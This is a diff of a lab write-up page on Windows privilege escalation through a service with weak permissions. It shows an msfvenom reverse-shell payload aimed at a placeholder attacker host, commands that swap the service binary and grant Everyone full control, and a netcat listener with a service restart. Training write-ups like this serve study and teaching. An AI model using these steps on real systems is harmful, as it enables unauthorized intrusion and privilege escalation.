@@ -3,10 +3,9 @@ sidebar_position: 1
 title: Insecure Permissions
 ---
 
+## Service Analysis
 
 - <b style={{ color: 'MediumTurquoise' }}>WindowsScheduler</b> Service has <span style={{fontWeight: 'Bold'}}>Weak Permissions</span> that allows the Modification - Replacement. It is possible to gain the Privileges of the Service.
-
-- **The Service runs as User:** `svcusr1`
 
 ```log
 C:\> sc qc "WindowsScheduler"
@@ -39,7 +38,8 @@ C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
 ```
 
 <br/>
-<br/>
+
+### PAYLOAD
 
 - Generating and Transferring the **PAYLOAD**
 
@@ -53,15 +53,16 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-se
 - We need another User to execute the **PAYLOAD**, so we grant Full Permission to the **Everyone Group:** <b style={{ color: 'DeepSkyBlue' }}>Everyone:(F)</b>
 
 ```powershell
-C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
 C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
 C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
 ```
 
 <br/>
 
-- Starting a `netcat` Listener
-- Restarting the <b style={{ color: 'MediumTurquoise' }}>WindowsScheduler</b> Service. <span style={{fontWeight: 'Bold'}}>(In a Normal case Scenario we would have to Wait for a Service Restart)</span>
+### Restarting The Service
+
+- Starting a `netcat` Listener.
+- Restarting the <b style={{ color: 'MediumTurquoise' }}>WindowsScheduler</b> Service. <span style={{fontWeight: 'Bold'}}>[In a Normal case Scenario we would have to Wait for a Service Restart]</span>
 
 ```log
 C:\> sc stop  "WindowsScheduler"
